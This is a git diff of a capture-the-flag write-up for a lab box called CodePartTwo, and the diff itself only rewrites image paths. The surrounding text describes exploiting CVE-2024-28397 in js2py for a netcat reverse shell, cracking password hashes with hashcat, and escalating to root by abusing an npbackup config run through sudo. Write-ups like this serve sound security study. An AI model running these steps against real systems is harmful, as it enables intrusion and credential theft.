@@ -6,25 +6,25 @@ mkdir nmap
 nmap -sV -sC -oA codeparttwo 10.10.11.82
 ```
 
-![](../../../attachments/Pasted%20image%2020251110213857.png)
+![](../attachments/Pasted%20image%2020251110213857.png)
 
 I run `gobuster` to enumerate directories:
 
-![](../../../attachments/Pasted%20image%2020251110220724.png)
+![](../attachments/Pasted%20image%2020251110220724.png)
 
 but I didn't find anything useful.
 
 Then I visited the site on port 8000:
 
-![](../../../attachments/Pasted%20image%2020251110220821.png)
+![](../attachments/Pasted%20image%2020251110220821.png)
 
 I press the `Download App` button and then I find the `app.py` and the `requirements.txt`. In the `requirements.txt` I found:
 
-![](../../../attachments/Pasted%20image%2020251110220945.png)
+![](../attachments/Pasted%20image%2020251110220945.png)
 
 and searching on the Internet to find some vulnerabilities for these versions I found that when I googled `js2py 0.74` I found the `CVE 2024-28397`. So I searched on Google to find how to exploit this vulnerability and eventually I found this GitHub page:
 
-![](../../../attachments/Pasted%20image%2020251110221247.png)
+![](../attachments/Pasted%20image%2020251110221247.png)
 
 So following the instructions we run `netcat` on one terminal:
 ```sh
@@ -178,11 +178,11 @@ and then we run the `exploit.py`:
 python3 exploit.py --target http://10.10.11.82:8000/run_code --lhost 10.10.14.125 --lport 4444
 ```
 
-![](../../../attachments/Pasted%20image%2020251110222345.png)
+![](../attachments/Pasted%20image%2020251110222345.png)
 
 and on the other terminal, where we ran the `netcat` we got a shell:
 
-![](../../../attachments/Pasted%20image%2020251110222428.png)
+![](../attachments/Pasted%20image%2020251110222428.png)
 
 Then we upgrade it to an interactive shell with:
 ```python
@@ -191,27 +191,27 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 We find the database and the password hashes of two users `marco` and `app`:
 
-![](../../../attachments/Pasted%20image%2020251110222711.png)
+![](../attachments/Pasted%20image%2020251110222711.png)
 
 Then we run `hashcat`:
 ```sh
 hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
-![](../../../attachments/Pasted%20image%2020251110223114.png)
+![](../attachments/Pasted%20image%2020251110223114.png)
 
 We find the password of the user `marco`. So we are able to ssh to the user `marco` and find the user flag!!!
 ```sh
 ssh@10.10.11.82
 ```
 
-![](../../../attachments/Pasted%20image%2020251110223433.png)
+![](../attachments/Pasted%20image%2020251110223433.png)
 
 
 ## Privilege Escalation
 Firstly, we type `sudo -l` to find what we can run as `sudo`:
 
-![](../../../attachments/Pasted%20image%2020251110223556.png)
+![](../attachments/Pasted%20image%2020251110223556.png)
 so we can run `npbackup-cli` as root without supplying a password.
 
 We can see it requires some config file, which is available at `/home/marco/npbackup.conf`
@@ -221,16 +221,16 @@ So after that I will copy the `npbackup.conf` to a random file that I will creat
 cp npbackup.conf malicious.conf
 ```
 
-![](../../../attachments/Pasted%20image%2020251110225631.png)
+![](../attachments/Pasted%20image%2020251110225631.png)
 
 then modified the `paths` parameter to `/root/` and then using this new config file i create a snapshot:
 
-![](../../../attachments/Pasted%20image%2020251110232429.png)
+![](../attachments/Pasted%20image%2020251110232429.png)
 
 At first I tried to restore the `root.txt` but the user `marco` didn't have the permissions to read from that directory:
 
-![](../../../attachments/Pasted%20image%2020251110232641.png)
+![](../attachments/Pasted%20image%2020251110232641.png)
 
 then I used that snapshot(snapshot-id) to dump the contents within the backup root directory
 
-![](../../../attachments/Pasted%20image%2020251110232353.png)
+![](../attachments/Pasted%20image%2020251110232353.png)
